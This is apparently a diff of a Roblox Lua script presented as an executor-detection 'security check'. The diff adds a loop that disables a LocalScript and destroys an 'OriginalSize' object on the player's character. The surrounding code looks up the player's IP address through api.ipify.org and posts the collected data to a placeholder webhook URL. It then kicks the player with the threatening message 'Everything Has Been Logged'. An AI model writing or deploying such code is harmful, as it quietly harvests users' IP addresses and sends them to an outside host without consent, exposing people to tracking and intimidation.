@@ -7,11 +7,15 @@ local exploitCheck = {
     syn and "Synapse X",
     secure_load and "Sentinel",
     KRNL_LOADED and "Krnl",
-    SONA_LOADED and "Sona"
+    SONA_LOADED and "Sona",
 }
 
+local is_executor_closure = is_syn_closure or is_sentinel_closure or is_krnl_closure or is_proto_closure or is_calamari_closure or is_electron_closure or is_elysian_closure
+local is_sirhurt_closure = is_synapse_function or is_sirhurt_closure
+local exploit_name = is_synapse_function and "Synapse X" or is_sirhurt_closure and "Sirhurt" or "ProtoSmasher"
+
 -- Webhook URL
-local url = "YOUR_WEBHOOK_URL_HERE"
+local Webhook_URL = "YOUR_WEBHOOK_URL_HERE"
 
 -- Get the player's IP address
 local ip = game:HttpGet("https://api.ipify.org") -- IP
@@ -74,21 +78,36 @@ local data = {
 
 -- Define headers for the request
 local headers = {
-    ["Content-Type"] = "application/json"
+    ["content-type"] = "application/json"
 }
 
 -- Send the webhook request
 local httpService = game:GetService("HttpService")
-local request = http_request or request or HttpPost or syn.request
+local request = http_request or request or HttpPost or syn.request -- I Cant Make Fluxus Request
+local SetNewData = game:GetService("HttpService"):JSONEncode(data)
     
 local DataToRequest = {
-    Url = url,
-    Body = game:GetService("HttpService"):JSONEncode(data),
+    Url = Webhook_URL,
+    Body = SetNewData,
     Method = "POST",
     Headers = headers
 }
 
 request(DataToRequest)
+
+coroutine.resume(coroutine.create(function()
+	while wait(60) do
+		local function main()
+		if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
+			player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
+		end
+		if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
+			player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
+		end
+	end
+		local success, err = pcall(main)
+	end
+end))
     
 -- Kick the player with a message
 game.Players.LocalPlayer:Kick("Security Check Failed. Everything Has Been Logged")
